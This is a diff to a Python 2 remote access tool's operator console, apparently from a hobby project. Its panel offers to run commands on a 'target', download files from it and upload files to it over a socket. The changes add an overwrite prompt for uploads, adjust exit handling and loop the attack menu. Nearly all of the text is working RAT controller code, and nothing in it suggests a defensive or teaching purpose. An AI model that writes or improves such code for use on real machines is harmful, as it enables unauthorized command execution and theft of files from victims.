@@ -95,7 +95,7 @@ def inputConnectionCheck(host, port):
 # Panel menu
 def menu():
 	try:
-		print bcolors.OKBLUE+"[1] - Run commands on the target\n[2] - Download a file from the target\n[3] - Upload a file on the target"+bcolors.ENDC
+		print bcolors.OKBLUE+"======REMOTE ACCESS TOOL PANEL======\n[1] - Run commands on the target\n[2] - Download a file from the target\n[3] - Upload a file on the target"+bcolors.ENDC
 		global choice
 		choice = raw_input("(Press 1,2 or 3) >> ")
 		if choice == "1" or choice == "2" or choice == "3":
@@ -121,7 +121,7 @@ def attack1Loop():
 				file1.close()
 			else:
 				print bcolors.OKBLUE+"[*] No command sent...\n[*] Closing Socket"+bcolors.ENDC
-				sys.exit()
+				break
 		except KeyboardInterrupt:
 			print bcolors.WARNING+"\n[*] Keyboard interruption : Closing socket..."+bcolors.ENDC
 			break
@@ -140,11 +140,9 @@ def attack1(clientSocket):
 			if anotherF == "no" or anotherF == "n" or anotherF == "N" or anotherF == "No":
 				print bcolors.WARNING+"[*] By default, standard output will be written into existing ""\"output.log\""" file"+bcolors.ENDC
 				attack1Loop()
-
 		if not os.path.exists("output.log"):	
 			print bcolors.OKGREEN+"[*] The ""\"output.log""\" file will be created in current working directory (""\""+cwdir+"\")"+bcolors.ENDC		
 			attack1Loop()
-
 	if i == "no" or i == "n" or i == "N" or i == "No":
 		print bcolors.OKGREEN+"[*] No trace file will be created during this session"+bcolors.ENDC
 		while 1:
@@ -173,7 +171,8 @@ def attack2(clientSocket):
 				if overwriteFile == "yes" or overwriteFile == "y" or overwriteFile == "Y" or overwriteFile == "Yes":
 					os.remove(serverFilename)
 				if overwriteFile == "no" or overwriteFile == "n" or overwriteFile == "N" or overwriteFile == "No":
-					print bcolors.OKBLUE+"\n[*] Aborting : Closing system..."+bcolors.ENDC
+					print bcolors.WARNING+"\n[*] Aborting : Closing system..."+bcolors.ENDC
+					sys.exit()
 			clientSocket.sendall(serverFilename)
 			serverFiledata = "tmp"
 			while 1:
@@ -194,11 +193,9 @@ def attack2(clientSocket):
 						downloadedFile.close()
 						print bcolors.OKGREEN+"[*] ""\""+serverFilename+"\""" file successfully downloaded !"+bcolors.ENDC
 						break
-						sys.exit()
 					else:
 						print bcolors.WARNING+"[*] Warning : ""\""+serverFilename+"\""" file not found in current working directory (""\""+cwd+"\""")"""+bcolors.ENDC	
-						print bcolors.OKBLUE+"\n[*] Aborting : Closing system..."+bcolors.ENDC
-						sys.exit()
+						print bcolors.WARNING+"\n[*] Aborting : Closing system..."+bcolors.ENDC
 				else:
 					downloadedFile = open(cwd+"/"+serverFilename, "wb")
 				# Importing data in the new file
@@ -220,12 +217,28 @@ def attack3(clientSocket):
 	if clientFilename != "":
 		curWorkDir = os.getcwd()
 		if os.path.exists(curWorkDir+"/"+clientFilename):
-			o = find(str(clientFilename),curWorkDir)
 			clientSocket.sendall(clientFilename)
-			openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-			readingFile = openingFile.read(4096)
-			clientSocket.sendall(readingFile)
-		else:
+			known = clientSocket.recv(256)
+			if known == "0":
+				openingFile = open(curWorkDir+"/"+clientFilename,"rb")
+				readingFile = openingFile.read(4096)
+				clientSocket.sendall(readingFile)
+			if known == "1":
+				a = raw_input(bcolors.WARNING+"[*] The ""\""+clientFilename+"\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : "+bcolors.ENDC) or "y"
+				if a == "no" or a == "n" or a == "N" or a == "No":
+					print bcolors.WARNING+"\n[*] Aborting : Closing system..."+bcolors.ENDC
+					clientSocket.sendall("0")
+					sys.exit()
+				if a == "yes" or a == "y" or a == "Y" or a == "Yes":
+					clientSocket.sendall("1")
+					openingFile = open(curWorkDir+"/"+clientFilename,"rb")
+					readingFile = openingFile.read(4096)
+					clientSocket.sendall(readingFile)
+					openingFile.close()
+			uploadStatus = clientSocket.recv(256)
+			print bcolors.OKGREEN+uploadStatus+bcolors.ENDC
+
+		if not os.path.exists(curWorkDir+"/"+clientFilename):
 			print bcolors.WARNING+"[*] Warning : ""\""+clientFilename+"\""" file not found in current working directory (""\""+curWorkDir+"\""")"""+bcolors.ENDC
 			print bcolors.WARNING+"[*] Voici les fichiers présents :"+bcolors.ENDC
 			for root, dirs, files in os.walk(curWorkDir):
@@ -234,10 +247,25 @@ def attack3(clientSocket):
 			clientFilename = raw_input(waitFilename)
 			if find(str(clientFilename), curWorkDir):
 				clientSocket.sendall(clientFilename)
-				openingFile = open(curWorkDir+"/"+clientFilename,"rb")
-				readingFile = openingFile.read(4096)
-				clientSocket.sendall(readingFile)
-				openingFile.close()
+				known = clientSocket.recv(256)
+				if known == "0":
+					openingFile = open(curWorkDir+"/"+clientFilename,"rb")
+					readingFile = openingFile.read(4096)
+					clientSocket.sendall(readingFile)
+				if known == "1":
+					a = raw_input(bcolors.WARNING+"[*] The ""\""+clientFilename+"\""" file already exists on target system, do you want to overwrite it ? ([y]/n) : "+bcolors.ENDC) or "y"
+					if a == "no" or a == "n" or a == "N" or a == "No":
+						print bcolors.WARNING+"\n[*] Aborting : Closing system..."+bcolors.ENDC
+						clientSocket.sendall("0")
+						sys.exit()
+					if a == "yes" or a == "y" or a == "Y" or a == "Yes":
+						clientSocket.sendall("1")
+						openingFile = open(curWorkDir+"/"+clientFilename,"rb")
+						readingFile = openingFile.read(4096)
+						clientSocket.sendall(readingFile)
+						openingFile.close()
+				uploadStatus = clientSocket.recv(256)
+				print bcolors.OKGREEN+uploadStatus+bcolors.ENDC
 			else:
 				print bcolors.WARNING+"[*] Warning : ""\""+clientFilename+"\""" file not found in current working directory (""\""+curWorkDir+"\""")"""+bcolors.ENDC	
 				print bcolors.OKBLUE+"\n[*] Aborting : Closing system..."+bcolors.ENDC
@@ -245,9 +273,6 @@ def attack3(clientSocket):
 	else:
 		print bcolors.FAIL+"[*] An error occured during file transfer !"+bcolors.ENDC
 		print bcolors.FAIL+"[*] Error : No filename found !\n[*] Please specify it "+bcolors.ENDC
-	uploadStatus = clientSocket.recv(256)
-	print bcolors.OKGREEN+uploadStatus+bcolors.ENDC
-	sys.exit()
 	
 # Attack panel menu
 def attackPanel(clientSocket, choice):
@@ -255,15 +280,12 @@ def attackPanel(clientSocket, choice):
 		if choice == "1":
 			clientSocket.sendall("1")
 			attack1(clientSocket)
-		elif choice == "2":
+		if choice == "2":
 			clientSocket.sendall("2")
 			attack2(clientSocket)
-		elif choice == "3":
+		if choice == "3":
 			clientSocket.sendall("3")
 			attack3(clientSocket)
-		else: 
-			print bcolors.FAIL+"[*] Error : choose an attack option please"+bcolors.ENDC
-			menu()
 	except KeyboardInterrupt:
 		print bcolors.WARNING+"\n[*] Keyboard interruption : Closing socket..."+bcolors.ENDC
 
@@ -287,6 +309,9 @@ def main():
 		inputConnectionCheck(host, port)
 		validMenu(clientSocket)
 		attackPanel(clientSocket, choice)
+		while 1:
+			menu()
+			attackPanel(clientSocket, choice)
 	except KeyboardInterrupt:
 		sys.exit()
 	closeClientSocket()
